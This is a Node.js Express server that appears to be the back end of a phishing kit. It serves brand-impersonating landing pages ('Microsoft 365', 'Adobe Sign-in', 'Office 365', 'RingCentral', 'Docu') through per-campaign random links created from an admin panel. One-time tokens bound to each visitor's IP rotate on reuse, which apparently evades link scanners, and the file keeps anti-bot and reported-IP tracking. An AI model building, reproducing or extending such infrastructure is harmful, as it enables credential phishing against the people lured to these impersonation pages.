// server.js
require('dotenv').config();
const express = require('express');
const crypto = require('crypto');
const path = require('path');
const rateLimit = require('express-rate-limit');
const fetch = require('node-fetch');

const app = express();
const PORT = process.env.PORT || 3000;
const DOCUMENT_URL = process.env.DOCUMENT_URL || 'https://example.com/your-secure-document';
const TOKEN_TTL_MS = (parseInt(process.env.TOKEN_TTL_MIN || '10', 10) * 60 * 1000);

app.use(express.json());

// 🔹 Trust only 1 proxy (safe for VPS + Nginx/Cloudflare)
app.set('trust proxy', 1);

// In-memory stores
let tokens = {};
let accessLogs = [];
let reportedIPs = new Set();
let landingLinks = {};
let lastAntibotReports = new Set();

// Default landing templates
const defaultPages = {
  "365.html": "<h1>Microsoft 365 Landing</h1>",
  "adobe.html": "<h1>Adobe Sign-in Page</h1>",
  "office365.html": "<h1>Office 365 Landing</h1>",
  "rincentral.html": "<h1>RingCentral Landing</h1>",
  "voice.html": "<h1>Voice Portal Landing</h1>",
  "docu.html": "<h1>Docu Landing</h1>"
};

// Logging helper
function logLine(line) {
  const stamp = new Date().toISOString();
  const entry = `[${stamp}] ${line}`;
  accessLogs.push(entry);
  console.log(entry);
}

// Rate limiter
const limiter = rateLimit({
  windowMs: 60 * 1000,
  max: parseInt(process.env.RATE_LIMIT_PER_MIN || '60', 10),
  standardHeaders: true,
  legacyHeaders: false,
  handler: (req, res) => {
    logLine(`RATE_LIMIT_EXCEEDED ip=${getClientIp(req)} path=${req.originalUrl}`);
    res.status(429).send('Too many requests. Try again later.');
  }
});
app.use(limiter);

// Static assets
app.use('/static', express.static(path.join(__dirname)));
app.use(express.static(path.join(__dirname)));

function generateToken() {
  return crypto.randomBytes(32).toString('hex');
}

function getClientIp(req) {
  let ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress || req.ip || '';
  if (ip.includes(',')) ip = ip.split(',')[0];
  return ip.replace('::ffff:', '').trim();
}

// Serve admin panel
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "login_admin.html"));
});

// Login.js panel
// Add this route
app.post('/admin/login', express.json(), (req, res) => {
    const { username, password } = req.body;
    
    // Check against .env credentials
    if (username === process.env.ADMIN_USER && password === process.env.ADMIN_PASS) {
        res.json({ success: true, message: 'Login successful' });
    } else {
        res.status(401).json({ success: false, message: 'Invalid username or password' });
    }
});

// Config endpoint → frontends can fetch DOCUMENT_URL
app.get('/config', (req, res) => {
  res.json({ DOCUMENT_URL });
});

// Redirect handler
app.get("/redirect", (req, res) => {
  // Redirect user to DOCUMENT_URL from .env
  res.redirect(process.env.DOCUMENT_URL);
});


// ================= ADMIN ENDPOINTS =================
app.post('/admin/create-link', (req, res) => {
  const { landingPage } = req.body;
  const validPages = Object.keys(defaultPages);

  if (!validPages.includes(landingPage)) {
    return res.status(400).json({ error: 'Invalid landing page' });
  }

  const randomPath = crypto.randomBytes(8).toString('hex');
  landingLinks[randomPath] = landingPage;

  const fullUrl = `${req.protocol}://${req.get('host')}/${randomPath}`;
  logLine(`NEW_LINK page=${landingPage} url=${fullUrl}`);
  res.json({ url: fullUrl });
});

// Serve landing pages by generated link
app.get('/:pathId', (req, res, next) => {
  const { pathId } = req.params;

  if (landingLinks[pathId]) {
    const token = req.query.token;

    // Issue new token
    if (!token || !tokens[token]) {
      const newToken = generateToken();
      tokens[newToken] = { createdAt: Date.now(), ip: getClientIp(req), used: false, ttl: TOKEN_TTL_MS };
      logLine(`TOKEN_ISSUED_FOR_LANDING token=${newToken} pathId=${pathId}`);
      return res.redirect(`/${pathId}?token=${newToken}`);
    }

    // Rotate token if invalid
    if (tokens[token].used || Date.now() - tokens[token].createdAt > TOKEN_TTL_MS || tokens[token].ip !== getClientIp(req)) {
      const newToken = generateToken();
      tokens[newToken] = { createdAt: Date.now(), ip: getClientIp(req), used: false, ttl: TOKEN_TTL_MS };
      tokens[token].used = true;
      logLine(`TOKEN_ROTATED_FOR_LANDING old=${token} new=${newToken} pathId=${pathId}`);
      return res.redirect(`/${pathId}?token=${newToken}`);
    }

    // Valid token → serve landing page
    tokens[token].used = true;
    logLine(`TOKEN_CONSUMED_FOR_LANDING token=${token} pathId=${pathId}`);

    const filePath = path.join(__dirname, landingLinks[pathId]);
    res.sendFile(filePath, (err) => {
      if (err) {
        logLine(`FILE_NOT_FOUND serving default page: ${landingLinks[pathId]}`);
        res.send(defaultPages[landingLinks[pathId]]);
      }
    });
  } else {
    next();
  }
});

// ===================================================
// STATUS
app.get('/__status', (req, res) => {
  res.json({
    status: 'ok',
    tokens_in_memory: Object.keys(tokens).length,
    logs_in_memory: accessLogs.length,
    reported_ips: Array.from(reportedIPs),
    active_links: landingLinks
  });
});

// Listen on all interfaces
app.listen(PORT, '0.0.0.0', () => {
  console.log(`✅ Server running on http://0.0.0.0:${PORT}`);
  logLine(`SERVER_STARTED port=${PORT}`);
});
